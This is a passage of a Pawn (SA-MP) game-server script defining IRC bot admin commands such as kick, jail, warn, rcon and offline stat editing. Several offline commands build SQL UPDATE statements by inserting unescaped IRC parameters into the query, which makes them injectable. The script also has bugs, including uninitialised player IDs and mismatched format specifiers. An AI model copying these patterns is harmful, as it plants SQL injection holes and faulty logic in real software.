	    format(string, sizeof(string),"11,10Player %s's dlevel has been changed.[%s]", target,level);
	    IRC_GroupSay(gGroupID,IRC_CHANNEL,string);

  }
  return 1;
 }
IRCCMD:setoffkills(botid, channel[], user[], host[], params[])
{
  if(IRC_IsOp(botid, channel, user))
  {
	  new target[50];
	  new level;
	  if(sscanf(params,"sd",target,level)) return IRC_GroupSay(gGroupID,IRC_CHANNEL,"11,10Usage: !setoffkills <playername> <kills>");
        new query[200];
	    format(query, sizeof(query), "UPDATE Accounts SET Kills=%d WHERE Name='%s'", level,target);
	    mysql_query(query);
	    mysql_store_result();
	    new string[200];
	    format(string, sizeof(string),"11,10Player %s's kills have been changed.[%s]", target,level);
	    IRC_GroupSay(gGroupID,IRC_CHANNEL,string);

  }
  return 1;
 }
IRCCMD:setoffdeaths(botid, channel[], user[], host[], params[])
{
  if(IRC_IsOp(botid, channel, user))
  {
	  new target[50];
	  new level;
	  if(sscanf(params,"sd",target,level)) return IRC_GroupSay(gGroupID,IRC_CHANNEL,"11,10Usage: !setoffdeaths <playername> <deaths>");
        new query[200];
	    format(query, sizeof(query), "UPDATE Accounts SET Deaths=%d WHERE Name='%s'", level,target);
	    mysql_query(query);
	    mysql_store_result();
	    new string[200];
	    format(string, sizeof(string),"11,10Player %s's deaths have been changed.[%s]", target,level);
	    IRC_GroupSay(gGroupID,IRC_CHANNEL,string);

  }
  return 1;
 }
IRCCMD:setoffname(botid, channel[], user[], host[], params[])
{
  if(IRC_IsAdmin(botid, channel, user))
  {
	  new target[50];
	  new newname[50];
	  if(sscanf(params,"ss",target,newname)) return IRC_GroupSay(gGroupID,IRC_CHANNEL,"11,10Usage: !setoffname <playername> <New name>");
        new query[200];
	    format(query, sizeof(query), "UPDATE Accounts SET Name='%s' WHERE Name='%s'", newname,target);
	    mysql_query(query);
	    mysql_store_result();
	    new string[200];
	    format(string, sizeof(string),"11,10Player %s's name has been changed.[%s]", target,newname);
	    IRC_GroupSay(gGroupID,IRC_CHANNEL,string);

  }
  return 1;
 }

 /*IRCCMD:setofflevel(botid, channel[], user[], host[], params[])
{
  if(IRC_IsAdmin(botid, channel, user))
  {
	  new target[50];
	  new level;
	  if(sscanf(params,"sd",target,level)) return IRC_GroupSay(gGroupID,IRC_CHANNEL,"11,10Usage: !setoffname <playername> <New name>");
        new query[200];
	    format(query, sizeof(query), "UPDATE Accounts SET Level=%d WHERE Name='%s'", level,target);
	    mysql_query(query);
	    mysql_store_result();
	    new string[200];
	    format(string, sizeof(string),"11,10Player %s's has been has been set to %s", target,level);
	    IRC_GroupSay(gGroupID,IRC_CHANNEL,string);

  }
  return 1;
 }
IRCCMD:setofflevel(botid, channel[], user[], host[], params[])
{
  if(IRC_IsOwner(botid, channel, user))
  {
	  new target[50];
	  new level99;
	  if(sscanf(params,"sd",target,level99)) return IRC_GroupSay(gGroupID,IRC_CHANNEL,"11,10Usage: !setofflevel <playername> <level>");
	  new rows = mysql_num_rows();
	  if(rows == 1)
	  {
        new query[200];
	    format(query, sizeof(query), "UPDATE Accounts SET Level=%d WHERE Name='%s'", level99, target);
	    mysql_query(query); // why uquery??
	    mysql_store_result();
	    new string[200];
	    format(string, sizeof(string),"11,10Player %s's level has been set to %d!.", target,level99);
	    IRC_GroupSay(gGroupID,IRC_CHANNEL,string);

	  }
	  else if(!rows)
	  {
	    new str[128];
	    format(str, sizeof(str),"11,10[ERROR]:Nick %s was not found!", target);
	    IRC_GroupSay(gGroupID,IRC_CHANNEL,str);
	    mysql_free_result();
	  }
  }return 0;
 }

*/
IRCCMD:setlevel(botid, channel[], user[], host[], params[])
{
  if(IRC_IsOwner(botid, channel, user))
  {
			new playerid;
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(params)) return IRC_GroupSay(gGroupID,IRC_CHANNEL, " 11,10Usage:!setlevel [playerid] [level]");
	    	new player1, level, playername[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);
			if(isnull(tmp2)) return IRC_GroupSay(gGroupID,IRC_CHANNEL," 11,10Usage:!setlevel [playerid] [level]");
			level = strval(tmp2);

			if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
				if(Logged[player1] == 1) {
					if(level > 10 ) return IRC_GroupSay(gGroupID,IRC_CHANNEL,"JikyBot: Incorrect Level");
					if(level == PlayerInfo[player1][Level]) return IRC_GroupSay(gGroupID,IRC_CHANNEL,"JikyBot: Player is already this level");
					GetPlayerName(player1, playername, sizeof(playername));
			       	new year,month,day;   getdate(year, month, day); new hour,minute,second; gettime(hour,minute,second);

					if(level > 0) format(string,sizeof(string),"Administrator %s has set you to Administrator Status [level %d]",user, level);
					else format(string,sizeof(string),"Administrator %s has set you to Player Status [level %d]",user, level);
					SendClientMessage(player1,blue,string);

					if(level > PlayerInfo[player1][Level]) GameTextForPlayer(player1,"~g~Promoted", 2000, 3);
					else GameTextForPlayer(player1,"~r~Demoted", 2000, 3);

					format(string,sizeof(string),"You have made %s Level %d on %d/%d/%d at %d:%d:%d", playername, level, day, month, year, hour, minute, second); IRC_GroupSay(gGroupID,IRC_CHANNEL, string);
					format(string,sizeof(string),"Administrator %s has made %s Level %d on %d/%d/%d at %d:%d:%d",user, playername, level, day, month, year, hour, minute, second);
					SaveToFile("AdminLog",string);
					new query[200]; //Creates the variables
  					format(query, sizeof(query), "UPDATE Accounts SET Level=%d WHERE Name='%s'", PlayerInfo[playerid][Level], playername);
					dUserSetINT(PlayerName2(player1)).("level",(level));
					PlayerInfo[player1][Level] = level;
					TempAdmin[player1] = level;
					return PlayerPlaySound(player1,1057,0.0,0.0,0.0);
				} else return IRC_GroupSay(gGroupID,IRC_CHANNEL,"JikyBot: Player must be registered and logged in to be admin");
			} else return IRC_GroupSay(gGroupID,IRC_CHANNEL, "Player is not connected");
		} else return IRC_GroupSay(gGroupID,IRC_CHANNEL,"[LEVEL-INFO]:Invalid command!");
}
IRCCMD:getid(botid, channel[], user[], host[], params[])
{

	if(isnull(params)) return IRC_GroupSay(gGroupID,IRC_CHANNEL, "JikyBot: 11,10JikyBot: Usage:/getid [part of nick]");
	new found, string[128], playername[MAX_PLAYER_NAME];

	format(string,sizeof(string)," 11,10Searched for: \"%s\" ",params);
	IRC_GroupSay(gGroupID,IRC_CHANNEL, string);
	for(new i=0; i <= MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
	  		GetPlayerName(i, playername, MAX_PLAYER_NAME);
			new namelen = strlen(playername);
			new bool:searched=false;
	    	for(new pos=0; pos <= namelen; pos++)
			{
				if(searched != true)
				{
					if(strfind(playername,params,true) == pos)
					{
		                found++;
						format(string,sizeof(string),"12%d. %s (ID %d)",found,playername,i);
						IRC_GroupSay(gGroupID,IRC_CHANNEL, string);
						searched = true;
					}

				}
			}
		}
	}
	new str[128];
	 if(found == 0)
	 format(str, sizeof(str), "11,4JikyBot: No players have %s in their nick",params);
	 IRC_GroupSay(gGroupID,IRC_CHANNEL, str);
 	return 1;
}
IRCCMD:ad(botid, channel[], user[], host[], params[])
{

	new string[128];
	if (IRC_IsHalfop(botid, channel, user))
	{
	if(!strlen(params))
	{
	     format(string,sizeof(string),"11,10Usage: !ad (Message)");
	     IRC_GroupSay(gGroupID, IRC_CHANNEL, string);


	    return 1;
	}
	format(string, sizeof(string),"[ADMIN CHAT] %s: %s", user, params);
	IRC_GroupSay(gGroupID,IRC_ADMINCHANNEL,string);
    MessageToAdmins2plus(C_PINK,string);

}	return 1;
}

IRCCMD:admin(botid, channel[], user[], host[], params[])
{
	if (IRC_IsHalfop(botid, channel, user))
	{
		if (!isnull(params))
		{
			new msg[112];
			format(msg,sizeof(msg), "Admin on IRC: %s", params);
			SendClientMessageToAll(green, msg);
			format(msg,sizeof(msg), "Admin on IRC: %s",  params);
		 	IRC_GroupSay(gGroupID, IRC_CHANNEL, msg);
	 	}
 	}
	return 1;
}
IRCCMD:kick(botid, channel[], user[], host[], params[]) {
 	if (IRC_IsHalfop(botid, channel, user))
	{
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    new endid;
		    if(isnull(params)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10JikyBot: 11,10Usage:!kick [playerid] [reason]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != endid && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
		 	    if(PlayerInfo[player1][Level] >= 10) return IRC_GroupSay(gGroupID, IRC_CHANNEL,"1,4JikyBot: This Admin Cannot be Kicked");
				if(PlayerInfo[player1][Level] >= 9) return IRC_GroupSay(gGroupID, IRC_CHANNEL,"1,4JikyBot: This Admin Cannot be Kicked");
				if(PlayerInfo[player1][Level] >= 8) return IRC_GroupSay(gGroupID, IRC_CHANNEL,"1,4JikyBot: This Admin Cannot be Kicked");
				GetPlayerName(player1, playername, sizeof(playername));		GetPlayerName(endid, adminname, sizeof(adminname));
				if (IRC_IsHalfop(botid, channel, user))
            	{
				if(isnull(tmp2)) {
					format(string,sizeof(string),"%s has been kicked by Administrator %s ",playername,adminname,params[2]); SendClientMessageToAll(red,string);
					format(string,sizeof(string),"[ No Reason Given ]",params[2]); SendClientMessageToAll(red,string);
					format(string,sizeof(string),"11,10%s has been kicked by Administrator %s ",playername,user,params[2]); IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
					format(string,sizeof(string),"11,10[ No Reason Given ]",params[2]);  IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
					SaveToFile("KickLog",string); print(string); return SetTimerEx("DelayedKick", 1000, false, "i", player1);
				} else {
					format(string,sizeof(string),"%s has been kicked by Administrator %s ",playername,adminname,params[2]); SendClientMessageToAll(red,string);
					format(string,sizeof(string),"[ Reason: %s ]",params[2]); SendClientMessageToAll(red,string);
					format(string,sizeof(string),"11,10%s has been kicked by Administrator %s ",playername,user,params[2]); IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
					format(string,sizeof(string),"11,10[ Reason: %s ]",params[2]); IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
					SaveToFile("KickLog",string); print(string); return SetTimerEx("DelayedKick", 1000, false, "i", player1); }
				}
			}else return IRC_GroupSay(gGroupID, IRC_CHANNEL, "Player is not connected or is yourself or is the highest level admin");
			} else return IRC_GroupSay(gGroupID, IRC_CHANNEL,"[LEVEL-INFO]:Invalid command! use !cmds to check full list.");


	return 1;
}
IRCCMD:warn(botid, channel[], user[], host[], params[]) {
    if (IRC_IsHalfop(botid, channel, user))
	{
		new endid;
	    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10JikyBot: 11,10Usage:!warn [playerid] [reason]");
    	new warned = strval(tmp), str[128];
		if(PlayerInfo[warned][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[endid][Level] != ServerInfo[MaxAdminLevel]) return IRC_GroupSay(gGroupID, IRC_CHANNEL,"11,10JikyBot: You cannot use this command on this admin");
	 	if(IsPlayerConnected(warned) && warned != INVALID_PLAYER_ID) {
 	    	if(warned != endid) {
 	    	if(Anti_Warn[warned] == 1) return IRC_GroupSay(gGroupID, IRC_CHANNEL,"11,10Player Already Warned");
				PlayerInfo[warned][Warnings]++;
				if (IRC_IsHalfop(botid, channel, user))
	{
				if( PlayerInfo[warned][Warnings] == MAX_WARNINGS) {
					format(str, sizeof (str), "Administrator \"%s\" has kicked \"%s\". (Warning: %d/%d)***", user, pName(warned),  PlayerInfo[warned][Warnings], MAX_WARNINGS);
					SendClientMessageToAll(red, str);
					format(str, sizeof (str), "[Reason: %s]",params[1+strlen(tmp)]);
					SendClientMessageToAll(red, str);
					format(str, sizeof (str), "11,10Administrator \"%s\" has kicked \"%s\". (Warning: %d/%d)***", user, pName(warned),  PlayerInfo[warned][Warnings], MAX_WARNINGS);
					IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
					format(str, sizeof (str), "11,10[Reason: %s]",params[1+strlen(tmp)]);
                    IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
					SaveToFile("KickLog",str);	Kick(warned);
					return PlayerInfo[warned][Warnings] = 0;
				} else {
					format(str, sizeof (str), "*Administrator \"%s\" has warned \"%s\". (Warning: %d/%d)***", user, pName(warned), PlayerInfo[warned][Warnings], MAX_WARNINGS);
					SendClientMessageToAll(yellow, str);
					format(str, sizeof (str), "[Reason: %s]",  params[1+strlen(tmp)]);
				    SendClientMessageToAll(yellow, str);
				    format(str, sizeof (str), "*11,10Administrator \"%s\" has warned \"%s\". (Warning: %d/%d)***", user, pName(warned), PlayerInfo[warned][Warnings], MAX_WARNINGS);
					IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
					format(str, sizeof (str), "11,10[Reason: %s]",  params[1+strlen(tmp)]);
				    IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
				    Anti_Warn[warned] = 1;
				    Warn[endid] = warned;
				    format(str, 9909, "{FF7E19}Name: %s\n{00F700}Admin: %s\n{E10000}Reason: %s\n{FF9E00}Warning: %d/%d",user,pName(endid),params[1+strlen(tmp)], PlayerInfo[warned][Warnings], MAX_WARNINGS);
                    ShowPlayerDialog((warned), 9909, DIALOG_STYLE_MSGBOX, "{00F700}Warned", str, "Close", "");
					}
				}

				Anti_Warn[warned] = 1;
				SetTimerEx("AntiWarn", 5000, true, "i",endid);
				return 1;
			} else return  IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10JikyBot: You cannot warn yourself");
		} else return  IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10JikyBot: Player is not connected");
	} else return  IRC_GroupSay(gGroupID, IRC_CHANNEL,"11,10[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

IRCCMD:players(botid, channel[], user[], host[], params[])  //made by Grove, taken from CYS Echo Bot 1.2
{
        new count, PlayerNames[512], string[256];
        for(new i=0; i<=MAX_PLAYERS; i++)
        {
                if(IsPlayerConnected(i))
                {
                        if(count == 0)
                        {
                                new PlayerName1[MAX_PLAYER_NAME];
                                GetPlayerName(i, PlayerName1, sizeof(PlayerName1));
                                format(PlayerNames, sizeof(PlayerNames),"2%s1", PlayerName1);
                                count++;
                        }
                        else
                        {
                                new PlayerName1[MAX_PLAYER_NAME];
                                GetPlayerName(i, PlayerName1, sizeof(PlayerName1));
                                format(PlayerNames, sizeof(PlayerNames),"%s, 2%s1", PlayerNames, PlayerName1);
                                count++;
                        }
                }
                else { if(count == 0) format(PlayerNames, sizeof(PlayerNames), "1No Players Online!"); }
        }

        new counter = 0;
        for(new i=0; i<=MAX_PLAYERS; i++)
        {
                if(IsPlayerConnected(i)) counter++;
        }

        format(string, 256, "50Connected Players[%d]:1 %s", counter, PlayerNames);
        IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
        #pragma unused params,user
        return true;
}
IRCCMD:pm(botid, channel[], user[], host[], params[]) {
   new str[128], str2[128], id;
   if(sscanf(params,"ds", id, str2)) return IRC_GroupSay(gGroupID, IRC_CHANNEL,"11,10JikyBot: 11,10Usage:!pm [id] [message]");
   if(IsPlayerConnected(id))
   {
		   if(DND[id] == 0)
		   {
		   		format(str, sizeof(str),"12PM to [%d]%s: %s", id, PlayerName2(id), str2);
		   		IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
		   		format(str, sizeof(str),"[IRC PM]%s:"cred" %s", user, str2);
		   		SendClientMessage(id, C_CYAN, str);

		   }
		   else return IRC_GroupSay(gGroupID, IRC_CHANNEL,"11,10That player is in DND[do not disturb] mode! Ask him in main chat for /dnd, then retry");

   }else return IRC_GroupSay(gGroupID, IRC_CHANNEL,"11,10Player is not connected Right Now");
   return 1;
}
IRCCMD:rcon(botid, channel[], user[], host[], params[])
{
        if (IRC_IsOwner(botid, channel, user))
        {
                if (!isnull(params))
                {
                        if (strcmp(params, "exit", true) != 0 && strfind(params, "loadfs irc", true) == -1)
                        {
                                new msg[128];
                                format(msg, sizeof(msg), "1,10RCON command %s has been executed.", params);
                                IRC_GroupSay(gGroupID, IRC_CHANNEL, msg);
                                SendRconCommand(params);
                        }
                }
        }
        return 1;
}
IRCCMD:jail(botid, channel[], user[], host[], params[]) {
	if (IRC_IsHalfop(botid, channel, user))
	{
			new endid;
		    new tmp[256], tmp2[256], tmp3[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index), tmp3 = strtok(params,Index);
		    if(isnull(params)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10JikyBot: 11,10Usage:!jail [playerid] [minutes] [reason]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				if(PlayerInfo[player1][Jailed] == 0) {
					GetPlayerName(player1, playername, sizeof(playername)); GetPlayerName(endid, adminname, sizeof(adminname));
					new jtime = strval(tmp2);
					if(jtime == 0) jtime = 9999;


					PlayerInfo[player1][JailTime] = jtime*1000*60;
    			    JailPlayer(player1);
    			    Jail1(player1);
		        	PlayerInfo[player1][Jailed] = 1;

					if(jtime == 9999) {
						if(!strlen(params[strlen(tmp2)+1])){
						 format(string,sizeof(string),"11,10Administrator %s has jailed %s ",user, playername);
						IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
						format(string,sizeof(string),"Administrator %s has jailed %s ",user, playername); SendClientMessageToAll(blue,string);
						SendClientMessageToAll(blue,string);
						}
						else{
						format(string,sizeof(string),"11,10Administrator %s has jailed %s [reason: %s]",user, playername, params[strlen(tmp)+1] );
						IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
						format(string,sizeof(string),"Administrator %s has jailed %s [reason: %s]",user, playername, params[strlen(tmp)+1] );
						SendClientMessageToAll(blue,string);
						}
   					} else {
						if(!strlen(tmp3)) {
						 format(string,sizeof(string),"11,10Administrator %s has jailed %s for %d minutes",user, playername, jtime);
						IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
                                           format(string,sizeof(string),"Administrator %s has jailed %s for %d minutes",user, playername, jtime); SendClientMessageToAll(blue,string);
										   SendClientMessageToAll(blue,string);
										   }
						else {
						format(string,sizeof(string),"11,10Administrator %s has jailed %s for %d minutes [reason: %s]",user, playername, jtime, params[strlen(tmp2)+strlen(tmp)+1] );
						IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
                             format(string,sizeof(string),"Administrator %s has jailed %s for %d minutes [reason: %s]",user, playername, jtime, params[strlen(tmp2)+strlen(tmp)+1] );
							 SendClientMessageToAll(blue,string);
							 }
					}

				} else return IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10Player is already in jail");
			} else return IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10Player is not connected or is the highest level admin");
		} else return IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
return 0;
}

IRCCMD:adan(botid, channel[], user[], host[], params[])
{
	if (IRC_IsOp(botid, channel, user))
	{
		if (!isnull(params))
		{
			new msg[112];
			format(msg,sizeof(msg), "%s", params);
			GameTextForAll(msg, 7000, 3);
			format(msg,sizeof(msg), "12[ANNOUNCEMENT by %s] %s", user, params);
			IRC_GroupSay(gGroupID, IRC_CHANNEL, msg);
		}
	}
	return 1;
}
IRCCMD:unjail(botid, channel[], user[], host[], params[]) {
	if (IRC_IsHalfop(botid, channel, user))
	{
			new endid;
		    new tmp[256], Index; tmp = strtok(params,Index);
		    if(isnull(params)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10JikyBot: 11,10Usage:!jail [playerid]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				if(PlayerInfo[player1][Jailed] == 1) {
					GetPlayerName(player1, playername, sizeof(playername)); GetPlayerName(endid, adminname, sizeof(adminname));
					format(string,sizeof(string),"Administrator %s has unjailed you",user);	SendClientMessage(player1,blue,string);
					format(string,sizeof(string),"Administrator %s has unjailed %s",user, playername); SendClientMessageToAll(blue,string);
						format(string,sizeof(string),"Administrator %s has unjailed %s",user, playername); IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
					JailRelease(player1);

				} else return IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10Player is not in jail");
			} else return IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10Player is not connected or is the highest level admin");
		} else return IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
     return 0;
}
IRCCMD:akill(botid, channel[], user[], host[], params[]) {
	if (IRC_IsOp(botid, channel, user))
	{
			new endid;
		    if(isnull(params)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,1011,10Usage:!akill [playerid]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(params);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
				if( (PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[endid][Level] != ServerInfo[MaxAdminLevel] ) )
					return IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10You cannot akill the highest level admin");
				GetPlayerName(player1, playername, sizeof(playername));	GetPlayerName(endid, adminname, sizeof(adminname));
				format(string,sizeof(string),"IRC Administrator %s has killed you",user);
				SendClientMessage(player1,blue,string);
				format(string,sizeof(string),"11,10You have killed %s",playername);
				IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
				format(string,sizeof(string),"IRC administrator %s has killed %s",user,playername);
				SendClientMessageToAll(blue,string);

				return SetPlayerHealth(player1,0.0);
			} else return IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10Player is not connected");
		} else return IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

IRCCMD:weaps(botid, channel[], user[], host[], params[]) {
	if (IRC_IsHalfop(botid, channel, user))
	{
	    if(isnull(params)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10JikyBot: Usage:/weaps [playerid]");
    	new player1, string[128], string2[64], WeapName[24], slot, weap, ammo, wh, x;
		player1 = strval(params);

	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			format(string2,sizeof(string2),"11,10[>> %s Weapons (id:%d) <<]", PlayerName2(player1), player1); IRC_GroupSay(gGroupID, IRC_CHANNEL, string2);
			for (slot = 0; slot < 14; slot++) {	GetPlayerWeaponData(player1, slot, weap, ammo); if( ammo != 0 && weap != 0) wh++; }
			if(wh < 1) return IRC_GroupSay(gGroupID, IRC_CHANNEL,"Player has no weapons");

			if(wh >= 1)
			{
				for (slot = 0; slot < 14; slot++)
				{
					GetPlayerWeaponData(player1, slot, weap, ammo);
					if( ammo != 0 && weap != 0)
					{
						GetWeaponName(weap, WeapName, sizeof(WeapName) );
						if(ammo == 65535 || ammo == 1) format(string,sizeof(string),"%s%s (1)",string, WeapName );
						else format(string,sizeof(string),"%s%s (%d)",string, WeapName, ammo );
						x++;
						if(x >= 5)
						{
						    IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
						    x = 0;
							format(string, sizeof(string), "");
						}
						else format(string, sizeof(string), "%s,  ", string);
					}
			    }
				if(x <= 4 && x > 0) {
					string[strlen(string)-3] = '.';
				    IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
				}
		    }
		    return 1;
		} else return IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10Player is not connected");
	} else return IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}


IRCCMD:aka(botid, channel[], user[], host[], params[]) {
	if (IRC_IsHalfop(botid, channel, user))
	{
	    if(isnull(params)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10JikyBot: Usage:/aka [playerid]");
    	new player1, playername[MAX_PLAYER_NAME], str[128], tmp3[50];
		player1 = strval(params);
	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
  		  	GetPlayerIp(player1,tmp3,50);
			GetPlayerName(player1, playername, sizeof(playername));
		    format(str,sizeof(str),"11,10AKA: [%s id:%d] [%s] %s", playername, player1, tmp3, dini_Get("ladmin/config/aka.txt",tmp3) );
	        return IRC_GroupSay(gGroupID, IRC_CHANNEL,str);
		} else return IRC_GroupSay(gGroupID, IRC_CHANNEL, "Player is not connected or is yourself");
	} else return IRC_GroupSay(gGroupID, IRC_CHANNEL,"[LEVEL-INFO]:Invalid command! use !cmds to check full list.");
}
IRCCMD:gas(botid, channel[], user[], host[], params[]){
	if(IRC_IsAdmin(botid, channel, user))
	{

      new tmp[256], Index; tmp = strtok(params,Index);
      if(isnull(tmp) || !IsNumeric(tmp)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10JikyBot: Usage:!gas [score]");
        new score = strval(tmp), string[128];
        for(new i;i<GetMaxPlayers();i++)
        {
        SetPlayerScore(i,GetPlayerScore(i)+score);
        PlayerPlaySound(i, 1057,0.0,0.0,0.0);
        }
        format(string,128,"Administrator \"%s\" has given everyone '%d' Scores : Rewards!",user,score);
        SendClientMessageToAll(C_PINK, string);
         format(string,128,"2Administrator \"%s\" has given everyone '%d' Scores : Rewards!",user,score);
         IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
        GameTextForAll("Recieved Scores From Admins Online!",5000,3);
    } else return IRC_GroupSay(gGroupID, IRC_CHANNEL,"[LEVEL-INFO]:Invalid command! use !cmds to check full list.");
    return 1;
}
IRCCMD:saveallstats(botid, channel[], user[], host[], params[]){
	if(IRC_IsAdmin(botid, channel, user))
	{
	   	for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
			    SavePlayer(i);
			}
		}
		new string[128];  format(string,sizeof(string),"Administrator \"%s\" has saved all players stats", user );
	     SendClientMessageToAll(C_PINK, string);
	     format(string,sizeof(string),"Administrator \"%s\" has saved all players stats", user );
	     IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
	} else return IRC_GroupSay(gGroupID, IRC_CHANNEL,"[LEVEL-INFO]:Invalid command! use !cmds to check full list.");
return 1;
}
IRCCMD:setkills(botid, channel[], user[], host[], params[]){
	if(IRC_IsAdmin(botid, channel, user))
	{
		new endid;
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10JikyBot: Usage:!setkills [playerid] [kills]");
		new player1 = strval(tmp), weather = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[endid][Level] != ServerInfo[MaxAdminLevel]) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(endid,"SETKILLS");
			format(string, sizeof(string), "You have set \"%s's\" Kills to '%d", pName(player1), weather); IRC_GroupSay(gGroupID, IRC_CHANNEL,string);
			if(player1 != endid) { format(string,sizeof(string),"Administrator \"%s\" has set your Kills to '%d'", user, weather); SendClientMessage(player1,blue,string); }
			PlayerInfo[player1][Kills] = weather;
   			return PlayerPlaySound(endid,1057,0.0,0.0,0.0);
	    } else return IRC_GroupSay(gGroupID, IRC_CHANNEL,"JikyBot: Player is not connected");
	} else return IRC_GroupSay(gGroupID, IRC_CHANNEL,"10,11[LEVEL-INFO]:Invalid command! use !cmds to check full list.");
}

IRCCMD:setdeaths(botid, channel[], user[], host[], params[]){
	if(IRC_IsAdmin(botid, channel, user))
	{
		new endid;
		new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10JikyBot: Usage:!setdeaths [playerid] [deaths]");
		new player1 = strval(tmp), weather = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[endid][Level] != ServerInfo[MaxAdminLevel]) return IRC_GroupSay(gGroupID, IRC_CHANNEL, "11,10JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(endid,"SETDEATHS");
			format(string, sizeof(string), "You have set \"%s's\" Deaths to '%d", pName(player1), weather); IRC_GroupSay(gGroupID, IRC_CHANNEL,string);
			if(player1 != endid) { format(string,sizeof(string),"Administrator \"%s\" has set your Deaths to '%d'", user, weather); SendClientMessage(endid,blue,string);  }
			PlayerInfo[player1][Deaths] = weather;
   			return PlayerPlaySound(endid,1057,0.0,0.0,0.0);
	    } else return IRC_GroupSay(gGroupID, IRC_CHANNEL,"JikyBot: Player is not connected");
	} else return IRC_GroupSay(gGroupID, IRC_CHANNEL,"10,11[LEVEL-INFO]:Invalid command! use !cmds to check full list.");
}
IRCCMD:bregister(botid, channel[], user[], host[], params[])
{
